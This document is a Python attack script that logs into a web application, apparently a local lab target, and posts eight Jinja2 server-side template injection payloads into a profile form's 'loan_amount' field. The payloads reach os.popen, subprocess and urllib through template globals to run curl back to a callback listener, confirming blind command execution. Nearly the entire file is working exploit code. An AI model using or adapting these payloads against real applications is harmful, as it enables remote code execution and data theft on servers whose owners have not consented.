import requests
import threading
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

# Configuration
base_url = "http://127.0.0.1:32813"
target_url = f"{base_url}/profile"
login_url = f"{base_url}/login"

# Track callbacks received
callbacks_received = []

class CallbackHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass  # Suppress default logging
    
    def do_GET(self):
        callback_id = self.path.split('/')[-1] if '/' in self.path else self.path
        print(f"[!] CALLBACK RECEIVED: {callback_id}")
        print(f"    Full path: {self.path}")
        print(f"    Client: {self.client_address[0]}:{self.client_address[1]}")
        callbacks_received.append(callback_id)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')

# Start local HTTP server in a thread
print("[*] Starting HTTP server on port 9999...")
server = HTTPServer(('localhost', 9999), CallbackHandler)
server_thread = threading.Thread(target=server.serve_forever)
server_thread.daemon = True
server_thread.start()
time.sleep(1)  # Give server time to start

# Create session and authenticate
session = requests.Session()
print("[*] Attempting to authenticate...")
try:
    login_data = {
        'username': 'test',
        'password': 'test',
        'csrf_token': ''  # Will be extracted from form
    }
    
    # Get login page to extract CSRF token and cookies
    login_page = session.get(login_url)
    print(f"[+] Login page status: {login_page.status_code}")
    
    # If CSRF token exists, extract it
    if 'csrf_token' in login_page.text:
        import re
        csrf_match = re.search(r'name="csrf_token" value="([^"]*)"', login_page.text)
        if csrf_match:
            login_data['csrf_token'] = csrf_match.group(1)
            print(f"[+] Extracted CSRF token: {login_data['csrf_token'][:20]}...")
    
    # Perform login
    login_response = session.post(login_url, data=login_data, allow_redirects=True)
    print(f"[+] Login status: {login_response.status_code}")
    print(f"[+] Session cookies: {dict(session.cookies)}")
    
    # Check if login was successful
    if 'login' not in login_response.url and (login_response.status_code == 200 or 'dashboard' in login_response.text or '/profile' in login_response.text):
        print("[+] Authentication successful!")
    else:
        print("[-] Authentication may have failed, but continuing...")
        
except Exception as e:
    print(f"[-] Login error (continuing anyway): {e}")
    print(f"    Cookies: {dict(session.cookies)}")

# Define SSTI payloads to test blind exfiltration
# Each payload attempts a different method of making outbound requests

# Payloads to test (Jinja2 template expressions)
payloads_to_test = [
    # Test 1: urllib.request.urlopen
    ("test1", "{{ urllib.request.urlopen('http://localhost:9999/test1') }}"),
    
    # Test 2: Alternative urllib access via config
    ("test2", "{{ config.__class__.__init__.__globals__['__builtins__']['__import__']('urllib.request').urlopen('http://localhost:9999/test2') }}"),
    
    # Test 3: os.popen with curl
    ("test3", "{{ os.popen('curl http://localhost:9999/test3') }}"),
    
    # Test 4: subprocess.check_output with curl
    ("test4", "{{ subprocess.check_output(['curl','http://localhost:9999/test4']) }}"),
]

# Additional payloads using different methods
additional_payloads = [
    # Using lipsum global
    ("test5", "{{ lipsum.__globals__['os'].popen('curl http://localhost:9999/test5').read() }}"),
    
    # Using request application
    ("test6", "{{ request.application.__self__._get_data_for_json.__globals__['os'].popen('curl http://localhost:9999/test6').read() }}"),
    
    # Using config with os directly
    ("test7", "{{ config.__class__.__init__.__globals__['os'].popen(\"curl http://localhost:9999/test7\").read() }}"),
    
    # Direct command execution
    ("test8", "{{ __import__('os').popen('curl http://localhost:9999/test8').read() }}"),
]

all_payloads = payloads_to_test + additional_payloads

print("\n[*] Testing SSTI payloads...")

for test_id, payload in all_payloads:
    print(f"\n--- Testing: {test_id} ---")
    print(f"[*] Payload: {payload}")
    
    # Prepare POST data with all required fields
    # Inject payload into loan_amount field (common injection point)
    post_data = {
        'name': 'Test',
        'lastname': 'User', 
        'email': 'test@example.com',
        'loan_amount': payload,
        'loan_term_months': '24',
        'monthly_payment': '0.0'
    }
    
    try:
        # Submit the payload
        response = session.post(target_url, data=post_data)
        print(f"[+] Request sent - Status: {response.status_code}")
        print(f"[+] Response length: {len(response.content)} bytes")
        print(f"    First 200 chars: {response.text[:200]}")
        
        # Wait a moment for potential callback
        time.sleep(1)
        
    except Exception as e:
        print(f"[-] Error sending payload: {e}")

# Wait a bit more for any delayed callbacks
print("\n[*] Waiting 3 more seconds for delayed callbacks...")
time.sleep(3)

# Shutdown server
print("\n[*] Shutting down HTTP server...")
server.shutdown()

# Report results
print("\n" + "="*60)
print("FINAL RESULTS")
print("="*60)
if callbacks_received:
    print(f"[+] SUCCESS! Blind exfiltration confirmed!")
    print(f"[+] Received {len(callbacks_received)} callbacks:")
    for cb in callbacks_received:
        print(f"    - {cb}")
else:
    print("[-] No callbacks received")
    print("[-] Blind exfiltration may not be possible, or payloads need refinement")
    
print(f"\n[*] Tested {len(all_payloads)} payloads")
